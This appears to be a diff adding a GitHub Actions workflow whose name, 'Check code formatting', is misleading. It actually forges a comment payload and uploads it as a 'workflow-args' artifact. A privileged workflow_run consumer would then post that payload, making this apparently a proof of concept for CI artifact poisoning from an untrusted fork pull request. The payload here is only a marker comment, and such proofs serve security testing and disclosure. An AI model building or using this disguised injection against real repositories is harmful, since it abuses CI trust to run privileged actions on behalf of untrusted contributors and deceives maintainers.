@@ -1,0 +1,17 @@
+name: "Check code formatting"
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: build comment payload
+        run: |
+          printf '%s' '[{"body":"POC_MARKER_BOT_COMMENT: this text came from an untrusted fork PR artifact and was posted by the privileged workflow_run consumer (pull-requests: write)."}]' > comments
+      - uses: actions/upload-artifact@26f96dfa697d77e81fd5907df203aa23a56210a8 # v4.3.0
+        with:
+          name: workflow-args
+          path: comments
